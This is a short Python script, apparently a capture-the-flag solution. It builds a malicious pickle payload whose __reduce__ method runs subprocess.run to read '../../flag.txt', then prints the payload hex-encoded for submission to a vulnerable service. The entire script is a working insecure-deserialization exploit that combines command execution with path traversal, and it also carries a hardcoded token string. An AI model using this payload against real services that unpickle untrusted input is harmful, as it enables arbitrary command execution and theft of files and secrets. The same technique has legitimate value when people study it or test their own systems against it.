import binascii
import pickle
import subprocess

token_auth = "i_hide_a_lot_of_secrets"
     
class test:
         
     def __reduce__(self):
        command = ('cat','../../flag.txt',)
        return (subprocess.run,(command,))

pickled = pickle.dumps(test())

binP = binascii.hexlify(pickled)

print(f'this -> {binP.decode()}')
